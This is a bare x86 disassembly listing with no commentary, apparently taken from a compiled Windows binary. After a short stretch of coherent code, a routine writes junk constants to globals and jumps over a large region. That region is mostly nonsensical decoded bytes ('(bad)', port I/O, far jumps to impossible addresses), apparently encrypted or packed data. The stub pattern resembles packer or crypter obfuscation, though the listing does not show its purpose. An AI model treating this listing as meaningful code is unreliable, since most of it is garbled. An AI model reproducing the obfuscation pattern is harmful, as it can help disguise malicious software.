  406abf:	mov    eax,DWORD PTR [ebp+0xc]
  406ac2:	xor    eax,esi
  406ac4:	add    eax,edi
  406ac6:	mov    ds:0x413bb0,eax
  406acb:	mov    eax,DWORD PTR [ebp+0xc]
  406ace:	xor    eax,esi
  406ad0:	add    eax,edi
  406ad2:	mov    ds:0x413bb8,eax
  406ad7:	jmp    0x406ae6
  406adc:	mov    eax,ds:0x413bb8
  406ae1:	mov    ds:0x413bb0,eax
  406ae6:	mov    eax,DWORD PTR [ebp-0x24]
  406ae9:	mov    ecx,DWORD PTR ds:0x413bb0
  406aef:	add    DWORD PTR [eax],ecx
  406af1:	mov    eax,DWORD PTR [ebp-0xc]
  406af4:	mov    eax,DWORD PTR [eax]
  406af6:	pop    edi
  406af7:	pop    esi
  406af8:	pop    ebx
  406af9:	jmp    0x406b0b
  406afe:	push   0x87687689
  406b03:	call   DWORD PTR ds:0x412364
  406b09:	xor    eax,eax
  406b0b:	leave  
  406b0c:	ret    0xc
  406b0f:	push   ebp
  406b10:	mov    ebp,esp
  406b12:	push   ecx
  406b13:	mov    DWORD PTR ds:0x433693,0x272d
  406b1d:	push   ecx
  406b1e:	mov    eax,0x5a3fc98
  406b23:	mov    DWORD PTR [ebp-0x4],eax
  406b26:	mov    DWORD PTR ds:0x433667,ecx
  406b2c:	mov    ecx,DWORD PTR [ebp-0x4]
  406b2f:	mov    DWORD PTR ds:0x433693,0x4de2
  406b39:	mov    DWORD PTR [ebp-0x8],0x4ec1
  406b40:	mov    DWORD PTR ds:0x43360f,0x33b9
  406b4a:	cmp    ecx,eax
  406b4c:	jne    0x40734f
  406b52:	or     ecx,DWORD PTR ds:0x43369b
  406b58:	mov    ax,WORD PTR [ebp-0x8]
  406b5c:	sbb    DWORD PTR ds:0x43361b,ebx
  406b62:	mov    ecx,0x8a3c
  406b67:	mov    DWORD PTR ds:0x4336d3,0x29a7
  406b71:	jmp    0x406d50
  406b76:	cwde   
  406b77:	sahf   
  406b78:	inc    edi
  406b79:	mov    bh,0x41
  406b7b:	ja     0x406be5
  406b7d:	mov    cl,0xc9
  406b7f:	mov    DWORD PTR [ecx],0x881b765f
  406b85:	leave  
  406b86:	add    bh,BYTE PTR [ebx]
  406b88:	jle    0x406c08
  406b8a:	mov    esp,0x4d7e7e7f
  406b8f:	xor    DWORD PTR [edi],eax
  406b91:	nop
  406b92:	add    eax,0x9918aeed
  406b97:	popa   
  406b98:	xor    dl,cl
  406b9a:	fbstp  TBYTE PTR [eax-0x468856e6]
  406ba0:	dec    esp
  406ba1:	adc    eax,0x8371d67a
  406ba6:	or     DWORD PTR [eax-0x45],0x26
  406baa:	scas   eax,DWORD PTR es:[edi]
  406bab:	mov    ss,WORD PTR [ebx+edi*1+0x76fd7cdd]
  406bb2:	mov    ebx,0xcd5e54e1
  406bb7:	push   ss
  406bb8:	adc    ch,BYTE PTR [ebx+0x40ef137b]
  406bbe:	mov    BYTE PTR [esi+eax*4],cl
  406bc1:	xchg   DWORD PTR [esp+ebx*2+0x59],ebx
  406bc5:	push   eax
  406bc6:	sbb    ecx,DWORD PTR [esi-0x76]
  406bc9:	or     al,dl
  406bcb:	retf   
  406bcc:	jbe    0x406b54
  406bce:	scas   eax,DWORD PTR es:[edi]
  406bcf:	mov    al,0x19
  406bd1:	push   ebx
  406bd2:	or     al,0xe7
  406bd4:	mov    dl,0xcc
  406bd6:	and    eax,0xfe221ef7
  406bdb:	xor    al,0xc1
  406bdd:	mov    cl,0xf3
  406bdf:	dec    ecx
  406be0:	inc    ebp
  406be1:	adc    BYTE PTR [eax-0x4bf0d393],cl
  406be7:	and    DWORD PTR [esi+0x105e108d],0x43068e13
  406bf1:	jmp    0x406ba1
  406bf3:	ds and eax,0xdfd446da
  406bf9:	cwde   
  406bfa:	mov    al,0x49
  406bfc:	xchg   esi,eax
  406bfd:	shl    ecx,1
  406bff:	popf   
  406c00:	inc    edi
  406c01:	ror    bl,1
  406c03:	cmp    ah,cl
  406c05:	in     eax,0x48
  406c07:	loope  0x406bff
  406c09:	int    0x78
  406c0b:	sub    bl,BYTE PTR [ebp+0x7b]
  406c0e:	push   edx
  406c0f:	sahf   
  406c10:	lock mov eax,0xbb70d389
  406c16:	in     eax,0xda
  406c18:	adc    ebx,DWORD PTR [ecx+0x295e4cde]
  406c1e:	inc    ebp
  406c1f:	mov    DWORD PTR [ebx],esp
  406c21:	cs daa 
  406c23:	or     eax,0xe024450c
  406c28:	inc    ebx
  406c29:	lds    eax,FWORD PTR [ecx]
  406c2b:	and    ecx,DWORD PTR [ebx+0x34b103d7]
  406c31:	inc    ecx
  406c32:	jecxz  0x406c87
  406c34:	pop    fs
  406c36:	xchg   BYTE PTR [edx-0x1e2a41d4],dl
  406c3c:	adc    bl,BYTE PTR [ebp-0x6a4fbaf7]
  406c42:	cwde   
  406c43:	mov    edi,0x3d02c3b7
  406c48:	dec    ecx
  406c49:	inc    esp
  406c4a:	lods   eax,DWORD PTR ds:[esi]
  406c4b:	jns    0x406c79
  406c4d:	call   0x635f:0x15705e45
  406c54:	sbb    dl,BYTE PTR [eax+0x26]
  406c57:	daa    
  406c58:	pop    ebp
  406c59:	neg    dl
  406c5b:	icebp  
  406c5c:	fs mov bh,0xdb
  406c5f:	imul   DWORD PTR [ebx+0x15]
  406c62:	cmp    cl,cl
  406c64:	cmovp  edx,DWORD PTR [edi-0x337f3e32]
  406c6b:	and    BYTE PTR [ebp+0x74],dl
  406c6e:	mov    ss,WORD PTR [edx]
  406c70:	aaa    
  406c71:	push   ebx
  406c72:	adc    cl,cl
  406c74:	js     0x406c20
  406c76:	inc    esp
  406c77:	xor    eax,0x63a7a361
  406c7c:	adc    al,0x83
  406c7e:	icebp  
  406c7f:	mov    cs,WORD PTR [esi-0x12c77fc5]
  406c85:	mov    eax,0xa277ba0b
  406c8a:	xor    al,0x1e
  406c8c:	(bad)  
  406c8d:	hlt    
  406c8e:	sti    
  406c8f:	add    DWORD PTR [edi-0x46],0x1b
  406c93:	or     al,0x9e
  406c95:	pop    ss
  406c96:	xchg   ebp,esi
  406c98:	jns    0x406cf5
  406c9a:	test   DWORD PTR [edx+edi*4-0x20],0x4cd6a6f7
  406ca2:	mov    eax,0xb985bb55
  406ca7:	push   eax
  406ca8:	ret    
  406ca9:	(bad)  
  406caa:	fwait
  406cab:	sbb    DWORD PTR [esi-0x1e],ebp
  406cae:	fld    TBYTE PTR [edi+0x3dcc4a65]
  406cb4:	mov    cl,0x1b
  406cb6:	xor    bl,BYTE PTR [eax]
  406cb8:	mov    cl,0x9c
  406cba:	lahf   
  406cbb:	pusha  
  406cbc:	add    ebp,DWORD PTR [esi+0xa]
  406cbf:	mov    ?,WORD PTR [ebp-0x18]
  406cc2:	cld    
  406cc3:	sbb    bl,BYTE PTR [esp+ebp*8]
  406cc6:	dec    esi
  406cc7:	xchg   ebp,eax
  406cc8:	inc    edi
  406cc9:	inc    ebx
  406cca:	pop    edx
  406ccb:	mov    cl,0x9c
  406ccd:	xlat   BYTE PTR ds:[ebx]
  406cce:	mov    edx,0x7a7a0b86
  406cd3:	bound  edx,QWORD PTR [esi+ebp*1+0x68]
  406cd7:	sbb    ebp,DWORD PTR [ebx]
  406cd9:	xchg   esp,eax
  406cda:	shl    DWORD PTR [ecx-0x20],0xf6
  406cde:	mov    edi,DWORD PTR ss:[ebp+0x1bd2c81a]
  406ce5:	leave  
  406ce6:	push   ebx
  406ce7:	pop    ebp
  406ce8:	(bad)  
  406ce9:	lods   eax,DWORD PTR ds:[esi]
  406cea:	imul   ebp,edx,0x6c
  406ced:	lods   eax,DWORD PTR ds:[esi]
  406cee:	sub    bl,cl
  406cf0:	mov    ebp,0xf9a7ea39
  406cf5:	test   dh,bh
  406cf7:	mov    ch,0x31
  406cf9:	cmp    DWORD PTR [ebp-0x32],ebp
  406cfc:	(bad)  
  406cff:	rcl    DWORD PTR [ebx],0x5a
  406d02:	je     0x406cd9
  406d04:	imul   esp,DWORD PTR [edi],0x5f9559f9
  406d0a:	jmp    0x406ca1
  406d0c:	inc    eax
  406d0d:	sub    esi,DWORD PTR [esi-0x44]
  406d10:	inc    ebx
  406d11:	pop    eax
  406d12:	sbb    BYTE PTR [ecx],cl
  406d14:	out    dx,al
  406d15:	pop    eax
  406d16:	jmp    FWORD PTR [edx+0x44]
  406d19:	cmp    bl,BYTE PTR ds:0xf434a0a1
  406d1f:	in     al,dx
  406d20:	dec    eax
  406d21:	rcl    BYTE PTR [eax],cl
  406d23:	jne    0x406ce5
  406d25:	gs xchg ecx,eax
  406d27:	mov    bh,0xb5
  406d29:	push   esi
  406d2a:	js     0x406cfd
  406d2c:	lods   eax,DWORD PTR ds:[esi]
  406d2d:	jae    0x406cba
  406d2f:	mov    eax,0x2ad8c5ab
  406d34:	hlt    
  406d35:	mov    dh,0x5c
  406d37:	arpl   WORD PTR [eax],bp
  406d39:	ds daa 
  406d3b:	or     al,0xf9
  406d3d:	sbb    edi,edx
  406d3f:	add    BYTE PTR [esi+0x1e],ah
  406d42:	jae    0x406d38
  406d44:	es out 0xbf,al
  406d47:	lods   eax,DWORD PTR ds:[esi]
  406d48:	ds loope 0x406dc3
  406d4b:	sub    BYTE PTR [ebp+0x66264e37],dl
  406d51:	xor    eax,ecx
  406d53:	mov    ecx,0x3b02
  406d58:	sbb    DWORD PTR ds:0x43372f,0x433613
  406d62:	add    ax,cx
  406d65:	add    DWORD PTR ds:0x433723,0x7d57
  406d6f:	mov    ecx,DWORD PTR [ebp+0x8]
  406d72:	movzx  eax,ax
  406d75:	sbb    DWORD PTR ds:0x433663,0x43360f
  406d7f:	jmp    0x406f5e
  406d84:	cmp    DWORD PTR [ebx],ebp
  406d86:	es fdivrp st(4),st
  406d89:	repz shr DWORD PTR [ecx],0x6c
  406d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d8e:	pop    esi
  406d8f:	xor    al,0xc3
  406d91:	jne    0x406d32
  406d93:	fiadd  WORD PTR [eax+0x38]
  406d96:	jle    0x406e16
  406d98:	mov    esp,0x3b7e7e7f
  406d9d:	mov    ch,0x69
  406d9f:	jns    0x406dab
  406da1:	dec    ecx
  406da2:	retf   0x3fd1
  406da5:	ret    0x9ad3
  406da8:	popf   
  406da9:	int    0xcb
  406dab:	xlat   BYTE PTR ds:[ebx]
  406dac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406dad:	pop    ebx
  406dae:	aaa    
  406daf:	jae    0x406d47
  406db1:	test   DWORD PTR ds:0x43ab739c,edx
  406db7:	jne    0x406d7b
  406db9:	mov    bh,0x59
  406dbb:	imul   esi,esp,0x8
  406dbe:	inc    ebp
  406dbf:	add    eax,0xe9ab1cb4
  406dc4:	or     ch,BYTE PTR ds:0x4beb578a
  406dca:	and    al,0xfd
  406dcc:	xor    al,0xda
  406dce:	test   al,0x33
  406dd0:	inc    edx
  406dd1:	inc    ebx
  406dd2:	enter  0x43d1,0xda
  406dd6:	es or  ah,0x7b
  406dda:	xchg   esp,eax
  406ddb:	ja     0x406dfb
  406ddd:	adc    al,0xf3
  406ddf:	adc    ebp,DWORD PTR [ebx+0x49]
  406de2:	add    BYTE PTR [ebx-0x41308de3],dl
  406de8:	mov    ecx,0xeec7d0bd
  406ded:	mov    edx,0xf6490863
  406df2:	inc    ecx
  406df3:	jo     0x406d7b
  406df5:	xchg   esp,eax
  406df6:	in     al,0x6a
  406df8:	mov    edx,0xa1599b1
  406dfd:	aam    0x16
  406dff:	data16 loop 0x406dd4
  406e02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e03:	ds mov ah,0xd4
  406e06:	xchg   edx,eax
  406e07:	mov    dh,0x81
  406e09:	(bad)  
  406e0a:	mov    BYTE PTR [edx],bl
  406e0c:	or     BYTE PTR [esi-0x25a65b3b],ah
  406e12:	mov    bl,0xe6
  406e14:	cmc    
  406e15:	adc    bl,BYTE PTR ds:0x8a2b7c95
  406e1b:	loop   0x406e3c
  406e1d:	inc    edx
  406e1e:	and    dl,BYTE PTR [edx-0x1]
  406e21:	test   eax,0xcbf4a386
  406e26:	and    al,0xc3
  406e28:	in     al,dx
  406e29:	lock push cs
  406e2b:	xchg   edx,eax
  406e2c:	int    0xb8
  406e2e:	stc    
  406e2f:	fdivr  st,st(0)
  406e31:	sub    bl,cl
  406e33:	or     al,0x72
  406e35:	add    eax,0xb5f810dd
  406e3a:	shl    edx,1
  406e3c:	pop    edx
  406e3d:	cwde   
  406e3e:	ret    
  406e3f:	(bad)  
  406e41:	test   BYTE PTR [edx+eiz*8],al
  406e44:	xchg   esi,eax
  406e45:	jnp    0x406e45
  406e47:	in     eax,dx
  406e48:	out    0x54,al
  406e4a:	sbb    edi,DWORD PTR [edi+edi*1+0x68]
  406e4e:	in     eax,0x38
  406e50:	fwait
  406e51:	test   DWORD PTR [esp+esi*2+0x3b160d76],edx
  406e58:	lea    ebx,[eax]
  406e5a:	dec    edx
  406e5b:	cdq    
  406e5c:	pushf  
  406e5d:	outs   dx,BYTE PTR ds:[esi]
  406e5e:	push   ds
  406e5f:	call   0x3bb7:0x14c2b67a
  406e66:	out    dx,eax
  406e67:	add    DWORD PTR [ebx-0x2753c7ef],0xfffffff1
  406e6e:	mov    ch,0x99
  406e70:	popa   
  406e71:	aas    
  406e72:	fnsave [eax]
  406e74:	dec    edi
  406e75:	addr16 inc ebp
  406e77:	sub    BYTE PTR [ebx+0x6792207c],ch
  406e7d:	xchg   ebx,eax
  406e7e:	lahf   
  406e7f:	jge    0x406e81
  406e81:	call   0xaef18cd1
  406e86:	lods   eax,DWORD PTR ds:[esi]
  406e87:	cmp    eax,0x3980072e
  406e8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e8d:	xchg   ebx,eax
  406e8e:	mov    eax,ds:0xcc25e8e3
  406e93:	jbe    0x406ee8
  406e95:	dec    edi
  406e96:	and    ecx,DWORD PTR [ebp+0x455289ca]
  406e9c:	adc    al,0x56
  406e9e:	sahf   
  406e9f:	call   0xffe7:0x2129d61e
  406ea6:	mov    dl,0x1a
  406ea8:	int    0x6a
  406eaa:	mov    ch,0x10
  406eac:	cmc    
  406ead:	xchg   ecx,eax
  406eae:	les    ebx,FWORD PTR [ebp+0x77]
  406eb1:	(bad)  
  406eb2:	je     0x406ed5
  406eb4:	dec    esi
  406eb5:	xlat   BYTE PTR ds:[ebx]
  406eb7:	mov    esi,0x92757abb
  406ebc:	jae    0x406e87
  406ebe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ebf:	call   0xa6b4524b
  406ec4:	adc    al,0x3d
  406ec6:	xchg   ebx,eax
  406ec7:	rol    BYTE PTR [ebp-0x341f5f9b],cl
  406ecd:	retf   
  406ece:	dec    esi
  406ecf:	pop    sp
  406ed1:	rol    DWORD PTR [eax-0x362e3d09],0xc1
  406ed8:	call   0x798a:0xff3d049
  406edf:	pop    ecx
  406ee0:	sub    BYTE PTR [eax-0x5f],bh
  406ee3:	fdiv   QWORD PTR [eax]
  406ee5:	and    BYTE PTR [esi+0x7c],dl
  406ee8:	mov    ecx,0x645f7588
  406eed:	arpl   WORD PTR [ecx-0x127f3424],cx
  406ef3:	mov    ah,0x6f
  406ef5:	jecxz  0x406e99
  406ef7:	into   
  406ef8:	adc    eax,0x64faf41a
  406efd:	and    eax,0x5c9baf4a
  406f02:	ins    DWORD PTR es:[edi],dx
  406f03:	xor    DWORD PTR [eax+0x4af1c961],ebx
  406f09:	mov    cl,0x2b
  406f0b:	in     al,0x87
  406f0d:	cmp    dh,BYTE PTR [ecx-0x6ff70dd8]
  406f13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f14:	or     ebp,DWORD PTR [edx]
  406f16:	ret    
  406f17:	dec    eax
  406f18:	xor    al,0x70
  406f1a:	test   BYTE PTR [edi+0xb],ch
  406f1d:	inc    edi
  406f1e:	and    eax,0x39e08e2e
  406f23:	add    dh,ch
  406f25:	mov    edi,0x24401ecb
  406f2a:	ret    
  406f2b:	add    cl,ch
  406f2d:	sar    bh,cl
  406f2f:	mov    ebx,0xadd1ecf4
  406f34:	mov    ds:0x4e088296,eax
  406f39:	retf   
  406f3a:	and    ebx,edx
  406f3c:	or     eax,0x546f7957
  406f41:	out    0x2d,eax
  406f43:	ins    BYTE PTR es:[edi],dx
  406f44:	jge    0x406f35
  406f46:	enter  0x2117,0x57
  406f4a:	jae    0x406ed5
  406f4c:	pusha  
  406f4d:	jmp    0x3d662f22
  406f52:	pop    ebp
  406f53:	imul   ecx,edx,0x2bd60bab
  406f59:	and    esp,DWORD PTR ds:0xf72b9a3a
  406f5f:	rol    BYTE PTR [ecx+0x43360f25],1
  406f65:	add    BYTE PTR [ebx+0x36],dl
  406f68:	inc    ebx
  406f69:	add    BYTE PTR [ebx],ah
  406f6b:	add    DWORD PTR [ebx+0x189084d],ecx
  406f71:	jmp    0x406f7d
  406f76:	xor    DWORD PTR [ebp-0x4],0xe149eb8
  406f7d:	mov    ax,WORD PTR [ebp-0x8]
  406f81:	jmp    0x407160
  406f86:	dec    ebx
  406f87:	rcr    BYTE PTR [ecx],0x72
  406f8a:	mov    cl,0x73
  406f8c:	push   ecx
  406f8d:	loope  0x406f7e
  406f8f:	sahf   
  406f90:	adc    al,BYTE PTR ds:0x91d67d99
  406f96:	mov    es,esi
  406f98:	jle    0x407018
  406f9a:	mov    esp,0xcc7e7e7f
  406f9f:	or     BYTE PTR [ebp+eiz*1+0x19],0x38
  406fa4:	mov    WORD PTR [eax+0x4e96a949],es
  406faa:	popa   
  406fab:	and    eax,0xc90a5a10
  406fb0:	mov    al,ds:0x3e4d32be
  406fb5:	fstp   QWORD PTR [ecx+esi*1]
  406fb8:	hlt    
  406fb9:	add    bh,ah
  406fbb:	xor    BYTE PTR [ebp+0x98aede4],ch
  406fc1:	nop
  406fc2:	ror    DWORD PTR [ecx+0xcc26db5],1
  406fc8:	push   esi
  406fc9:	je     0x406f92
  406fcb:	les    ebp,FWORD PTR [edi-0x9]
  406fce:	pop    ds
  406fcf:	ss (bad) 
  406fd1:	mov    ecx,0x9ebb7b70
  406fd6:	fiadd  WORD PTR [esi+0x382949f2]
  406fdc:	add    BYTE PTR [ecx],bl
  406fde:	mov    cl,0x88
  406fe0:	dec    edx
  406fe1:	fs out 0xfb,al
  406fe4:	mov    al,0x7f
  406fe6:	daa    
  406fe7:	cwde   
  406fe8:	inc    edx
  406fe9:	xchg   DWORD PTR [edi+0x32],ebp
  406fec:	mov    dl,0xd2
  406fee:	loop   0x406fe8
  406ff0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ff1:	xor    cl,BYTE PTR [edi-0x7c]
  406ff4:	inc    ecx
  406ff5:	clc    
  406ff6:	sbb    DWORD PTR [esi],0x61
  406ff9:	xor    BYTE PTR [edx-0x36526643],dh
  406fff:	(bad)  
  407000:	ins    DWORD PTR es:[edi],dx
  407001:	sbb    esp,edi
  407003:	scas   al,BYTE PTR es:[edi]
  407004:	dec    cx
  407006:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407007:	cs jmp 0x3c3032f2
  40700d:	mov    DWORD PTR [ebp+0x45],ecx
  407010:	popa   
  407011:	xor    ecx,ebp
  407013:	or     ch,BYTE PTR [ebx-0x78]
  407016:	aam    0x9c
  407018:	pop    edi
  407019:	push   cs
  40701a:	(bad)  
  40701b:	ret    0x7d98
  40701e:	out    0xdb,eax
  407020:	xchg   BYTE PTR [ecx-0x54],ch
  407023:	pop    es
  407024:	pop    ds
  407025:	arpl   sp,si
  407027:	jl     0x406fb6
  407029:	xchg   esi,eax
  40702a:	inc    edi
  40702b:	outs   dx,BYTE PTR ds:[esi]
  40702c:	out    dx,eax
  40702d:	loope  0x407060
  40702f:	jne    0x406fcd
  407031:	call   0xfa046823
  407036:	sbb    al,0x60
  407038:	or     edi,ebp
  40703a:	jmp    DWORD PTR [esi-0x78cbcfa6]
  407040:	daa    
  407041:	jb     0x4070bb
  407043:	nop
  407044:	or     eax,0xc7b61747
  407049:	(bad)  
  40704a:	loop   0x4070c5
  40704c:	test   eax,0x2c965fbe
  407051:	fidiv  DWORD PTR [eax-0x75251c7d]
  407057:	scas   eax,DWORD PTR es:[edi]
  407058:	inc    edx
  407059:	jbe    0x407021
  40705b:	and    eax,eax
  40705d:	popa   
  40705e:	push   ss
  40705f:	and    BYTE PTR [ecx-0x10],ah
  407062:	stc    
  407063:	loope  0x40707c
  407065:	pop    ds
  407066:	jge    0x406fee
  407068:	xchg   edx,eax
  407069:	xchg   esp,eax
  40706a:	addr16 jge 0x407047
  40706d:	and    ch,BYTE PTR [ebp+esi*2-0x6c]
  407071:	aaa    
  407072:	and    eax,0xdc6917dd
  407077:	sti    
  407078:	xor    eax,0x83866c07
  40707d:	sbb    al,0x75
  40707f:	test   BYTE PTR cs:[ebx+0x5ecb760e],ch
  407086:	clc    
  407087:	inc    ecx
  407088:	ret    0xc77f
  40708b:	jge    0x40705d
  40708d:	or     DWORD PTR [esi-0x75],0x8443ac5b
  407094:	test   DWORD PTR [ebp-0x1d1b515e],ecx
  40709a:	imul   esi,DWORD PTR [ebx-0x5],0x758db086
  4070a1:	adc    al,0x54
  4070a3:	jbe    0x40702d
  4070a5:	in     al,0xc3
  4070a7:	pop    eax
  4070a8:	loopne 0x40709d
  4070aa:	inc    esp
  4070ab:	xchg   DWORD PTR [ebp+0x57],edx
  4070ae:	push   edi
  4070af:	(bad)  
  4070b0:	mov    cs,WORD PTR [edx-0x53641df1]
  4070b6:	adc    al,0x94
  4070b8:	inc    ebp
  4070b9:	adc    ch,al
  4070bb:	pop    es
  4070bc:	fcom   QWORD PTR [edi]
  4070be:	pop    eax
  4070bf:	xor    al,0xc2
  4070c1:	out    dx,eax
  4070c2:	cld    
  4070c3:	sbb    ebp,0xc8abfb6b
  4070c9:	jne    0x4070dc
  4070cb:	test   BYTE PTR es:[edx+0x7d],dh
  4070cf:	sub    eax,0x9f94a22b
  4070d4:	dec    edi
  4070d5:	outs   dx,BYTE PTR ds:[esi]
  4070d6:	jo     0x4070ba
  4070d8:	shr    BYTE PTR [ebx+eax*8-0x7613139c],0x39
  4070e0:	lds    edx,FWORD PTR [ebx+0x33]
  4070e3:	adc    DWORD PTR ds:0x16e7284b,ebp
  4070e9:	mov    esp,0xe893357d
  4070ee:	int3   
  4070ef:	loopne 0x407100
  4070f1:	or     eax,DWORD PTR [edx+0xc13e7a8]
  4070f7:	imul   edi
  4070f9:	add    al,al
  4070fb:	xor    eax,0xe44b9664
  407100:	inc    ebp
  407101:	cmp    bh,BYTE PTR [edx-0x6b3099dc]
  407107:	sub    edx,eax
  407109:	jecxz  0x4070e6
  40710b:	xchg   edx,eax
  40710c:	jns    0x407167
  40710e:	rol    DWORD PTR [edi+0x3b],1
  407111:	arpl   ax,di
  407113:	sub    BYTE PTR [ebx+0x6a],ch
  407116:	ja     0x4070d2
  407118:	mov    ah,0x73
  40711a:	aas    
  40711b:	enter  0x6ff0,0x5c
  40711f:	xlat   BYTE PTR ds:[ebx]
  407120:	jmp    0x8164:0x6066725
  407127:	pop    ebp
  407128:	pop    edx
  407129:	and    BYTE PTR [esi],cl
  40712b:	clc    
  40712c:	push   es
  40712d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40712e:	cmp    DWORD PTR [esi],0xffffffd5
  407131:	sbb    al,0xca
  407133:	push   ebx
  407134:	stc    
  407135:	add    eax,0xa3751e7
  40713a:	popf   
  40713b:	or     al,0x74
  40713d:	jmp    0x407152
  40713f:	push   esi
  407140:	xchg   edx,eax
  407141:	push   esi
  407142:	adc    eax,0x87915e8f
  407147:	push   edi
  407148:	pop    edx
  407149:	sti    
  40714a:	push   ebp
  40714b:	mov    bl,0x4c
  40714d:	imul   edx,DWORD PTR [eax+0x7ad48100],0x6c
  407154:	adc    DWORD PTR ds:0xd0433a87,ebx
  40715a:	sub    BYTE PTR [ebx+edi*8],dl
  40715d:	in     eax,0x8a
  40715f:	repnz push DWORD PTR [ebp+0x8]
  407163:	call   0x407353
  407168:	test   eax,eax
  40716a:	jmp    0x407349
  40716f:	and    eax,0xb1edb090
  407174:	in     eax,dx
  407175:	popa   
  407176:	push   eax
  407177:	retf   
  407178:	xchg   BYTE PTR [ebx-0x74],dh
  40717b:	mov    dl,0x79
  40717d:	ret    
  40717e:	and    esp,ecx
  407180:	les    edi,FWORD PTR [esi+0x7e]
  407183:	mov    esp,0xaf7e7e7f
  407188:	pop    ebx
  407189:	jmp    0x1b46:0xf257f6d0
  407190:	sbb    eax,0x98480258
  407195:	push   ss
  407196:	stos   BYTE PTR es:[edi],al
  407197:	push   eax
  407198:	cmp    DWORD PTR [ebx],edi
  40719a:	scas   eax,DWORD PTR es:[edi]
  40719b:	inc    esi
  40719c:	add    BYTE PTR [esi-0x6d212d75],bl
  4071a2:	and    dh,BYTE PTR [edi+esi*8+0x76]
  4071a6:	push   edi
  4071a7:	retf   
  4071a8:	in     al,dx
  4071a9:	icebp  
  4071aa:	retf   0xadf4
  4071ad:	pop    edx
  4071ae:	cld    
  4071af:	inc    ecx
  4071b0:	mov    cl,0x8c
  4071b2:	cwde   
  4071b3:	ja     0x40719f
  4071b5:	xchg   ebx,eax
  4071b6:	push   cs
  4071b7:	mov    ds:0x5b214ff7,eax
  4071bc:	inc    edx
  4071bd:	popa   
  4071be:	jae    0x407165
  4071c0:	or     eax,0x77f93ac
  4071c5:	lds    ebp,FWORD PTR [edi]
  4071c7:	lods   al,BYTE PTR ds:[esi]
  4071c8:	in     eax,dx
  4071c9:	and    DWORD PTR [ebp-0x78456472],0xf4dc7ec6
  4071d3:	and    cl,BYTE PTR [eax]
  4071d5:	sbb    ebx,DWORD PTR [edi-0x76052a53]
  4071db:	mov    edi,0xd5c5ae38
  4071e0:	cld    
  4071e1:	(bad)  
  4071e2:	adc    al,0xa3
  4071e4:	icebp  
  4071e5:	jb     0x407219
  4071e7:	xlat   BYTE PTR ds:[ebx]
  4071e8:	in     eax,0x9f
  4071ea:	sbb    eax,0xd532002b
  4071ef:	mov    edx,es
  4071f1:	into   
  4071f2:	arpl   WORD PTR [ecx-0x6b],di
  4071f5:	addr16 cdq 
  4071f7:	pushf  
  4071f8:	std    
  4071f9:	xor    bl,dl
  4071fb:	or     bl,dl
  4071fd:	push   ds
  4071fe:	xor    eax,0x1a2c509c
  407203:	mov    ebx,0x1119c073
  407208:	aam    0xc7
  40720a:	retf   
  40720b:	ds leave 
  40720d:	hlt    
  40720e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40720f:	ret    0x4514
  407212:	pop    ds
  407213:	jmp    0x45c2:0xcd2dc952
  40721a:	(bad)  
  40721b:	jnp    0x407261
  40721d:	imul   esp,DWORD PTR [eax],0xffffffa1
  407220:	push   edi
  407221:	cmp    esp,edi
  407223:	push   0x1919d9e0
  407228:	fnstsw WORD PTR [ecx]
  40722a:	or     eax,0xd728bb52
  40722f:	jle    0x4072af
  407231:	addr16 dec esi
  407233:	cmp    DWORD PTR [ebp+0x78],eax
  407236:	std    
  407237:	sbb    eax,0xf6a50cf8
  40723c:	and    edx,ecx
  40723e:	ins    BYTE PTR es:[edi],dx
  40723f:	pop    edx
  407240:	div    DWORD PTR [edi]
  407242:	mov    ebx,0x325f433e
  407247:	push   edx
  407248:	test   al,0xd8
  40724a:	xor    dh,bh
  40724c:	cmp    BYTE PTR [edi],0x10
  40724f:	(bad)  
  407251:	mov    dh,BYTE PTR [esi]
  407253:	in     eax,0xaf
  407255:	jno    0x4071f1
  407257:	add    al,0xb7
  407259:	or     al,0x5b
  40725b:	jns    0x407226
  40725d:	sahf   
  40725e:	mov    eax,ds:0x62aac807
  407263:	jmp    0x877e:0x74a0481b
  40726a:	pop    ss
  40726b:	dec    ebp
  40726c:	push   edx
  40726d:	pop    esp
  40726e:	jmp    0x89cc:0x48bd5a57
  407275:	pop    ecx
  407276:	jbe    0x4072dd
  407278:	js     0x407228
  40727a:	sub    DWORD PTR [ebx+0x2d],edx
  40727d:	fisubr DWORD PTR [esp+ebp*4-0x13]
  407281:	cmp    eax,0xd7784ab6
  407286:	jg     0x4072a4
  407288:	push   ss
  407289:	xor    bl,BYTE PTR [edi]
  40728b:	sbb    al,0x97
  40728d:	dec    edi
  40728e:	stc    
  40728f:	in     al,dx
  407290:	jge    0x4072e8
  407292:	or     BYTE PTR [ecx+ebx*4-0x5dcc3500],ah
  407299:	ds mov ah,0x7f
  40729c:	mov    eax,ds:0xb89ac471
  4072a1:	mov    dh,0x38
  4072a3:	push   ebx
  4072a4:	clc    
  4072a5:	not    esi
  4072a7:	cmp    cl,0xd8
  4072aa:	mov    esi,0x8ff45dfc
  4072af:	sahf   
  4072b0:	das    
  4072b1:	adc    cl,BYTE PTR [ecx]
  4072b3:	(bad)  
  4072b4:	pop    ds
  4072b5:	sbb    esi,DWORD PTR [ecx]
  4072b7:	adc    al,0x4e
  4072b9:	xor    ah,dl
  4072bb:	cmp    DWORD PTR [eax],ebx
  4072bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072be:	pop    ebx
  4072bf:	jecxz  0x4072b3
  4072c1:	in     eax,0x14
  4072c3:	clc    
  4072c4:	aad    0xd5
  4072c6:	mul    DWORD PTR [ecx+0x58664ed0]
  4072cc:	mov    cl,0x8b
  4072ce:	jg     0x407277
  4072d0:	outs   dx,BYTE PTR ds:[esi]
  4072d1:	fld    DWORD PTR [ecx-0xa]
  4072d4:	inc    ebx
  4072d5:	mov    edi,0xa57b5a45
  4072da:	mov    ds:0xfa497b9c,al
  4072df:	rcl    DWORD PTR [ebx+0x67127814],cl
  4072e5:	xchg   DWORD PTR [esi+0x41],eax
